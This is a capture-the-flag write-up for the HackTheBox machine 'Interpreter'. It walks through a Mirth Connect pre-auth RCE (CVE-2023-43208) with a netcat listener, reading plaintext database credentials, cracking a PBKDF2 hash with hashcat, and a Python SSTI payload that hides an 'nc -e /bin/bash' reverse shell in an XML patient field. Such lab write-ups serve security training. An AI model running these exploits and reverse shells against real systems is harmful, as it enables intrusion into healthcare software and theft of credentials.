# Interpreter - HackTheBox

**OS:** Linux
**Difficulty:** Medium
**Flags:**
- user.txt: [not recorded]
- root.txt: [not recorded]

---

## Summary

Interpreter runs NextGen Mirth Connect, a healthcare integration engine, which is vulnerable to pre-authenticated remote code execution (CVE-2023-43208). Initial access gives a shell under the Mirth service account. Database credentials found in the Mirth configuration connect to a local MySQL instance containing a user with a PBKDF2-SHA256 password hash, which cracks to give SSH access. The root path is a Python SSTI vulnerability in an internal service listening on localhost, reachable from the foothold user.

---

## Foothold - CVE-2023-43208 (Mirth Connect Pre-Auth RCE)

Mirth Connect versions below 4.4.1 are vulnerable to unauthenticated remote code execution via a Java deserialization issue in the message processing pipeline.

Use the public PoC:

```bash
python3 mirthconnect_exploit.py \
  -t <TARGET_IP> \
  -p 443 \
  -lh <YOUR_IP> \
  -lp 4444 \
  --exploit
```

Start a listener before firing:

```bash
nc -lvnp 4444
```

Shell arrives as the Mirth service user.

---

## Lateral Movement - Database Credentials and Hash Cracking

The Mirth Connect configuration file contains database credentials:

```bash
cat /usr/local/mirthconnect/conf/mirth.properties
```

```
database = mysql
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.username = mirthdb
database.password = MirthPass123!
keystore.storepass = 5GbU5HGTOOgE
keystore.keypass = tAuJfQeXdnPw
```

Connect to the database and enumerate users:

```bash
mysql -u mirthdb -p'MirthPass123!' -h 127.0.0.1 mc_bdd_prod
```

```sql
SELECT * FROM PERSON;
-- ID: 2, USERNAME: sedric

SELECT * FROM PERSON_PASSWORD;
-- PERSON_ID: 2, PASSWORD: u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

The hash is PBKDF2-SHA256 with 600000 iterations. The first 8 bytes of the decoded value are the salt. Extract and format it for hashcat:

```python
import base64
data = base64.b64decode('u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==')
salt = base64.b64encode(data[:8]).decode()
hash_ = base64.b64encode(data[8:]).decode()
print(f'sha256:600000:{salt}:{hash_}')
```

Crack with hashcat mode 10900:

```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

Result: `snowflake1`

SSH in as `sedric`. User flag is in the home directory.

---

## Privilege Escalation - SSTI in Internal Service

An internal service listens on `127.0.0.1:54321`. It accepts XML patient records at `/addPatient`. The `firstname` field is passed into a Python template engine without sanitisation, creating a Server-Side Template Injection (SSTI) vulnerability.

The payload uses Python's `__import__` to execute a reverse shell via base64 to avoid XML special character issues:

```python
import urllib.request, base64

cmd = 'nc <YOUR_IP> 4444 -e /bin/bash'
b64_cmd = base64.b64encode(cmd.encode()).decode()

xml = f'''<patient>
  <timestamp>20250101120000</timestamp>
  <sender_app>TEST</sender_app>
  <id>12345</id>
  <firstname>{{__import__("os").system(__import__("base64").b64decode("{b64_cmd}").decode())}}</firstname>
  <lastname>Doe</lastname>
  <birth_date>01/01/1990</birth_date>
  <gender>M</gender>
</patient>'''

req = urllib.request.Request(
    'http://127.0.0.1:54321/addPatient',
    data=xml.encode(),
    headers={'Content-Type': 'application/xml'}
)
urllib.request.urlopen(req)
```

Set up a listener before running the script:

```bash
nc -lvnp 4444
```

Shell arrives as root. Root flag is in `/root/`.

---

## Key Takeaways

- Healthcare integration software like Mirth Connect is often overlooked in patch cycles due to uptime requirements and change management friction - CVE-2023-43208 had public PoCs available for months before many deployments were updated
- Configuration files for application middleware (not just web servers) routinely contain database credentials in plaintext - check `/conf/`, `/config/`, and `/etc/` directories for any installed service
- PBKDF2 with high iteration counts is designed to be slow, but rockyou contains enough common passwords that short/dictionary-based passwords still fall quickly
- SSTI in XML-processing services is less commonly tested than in web forms - any field that appears in rendered output or triggers dynamic behaviour is worth probing with `{{7*7}}` equivalents
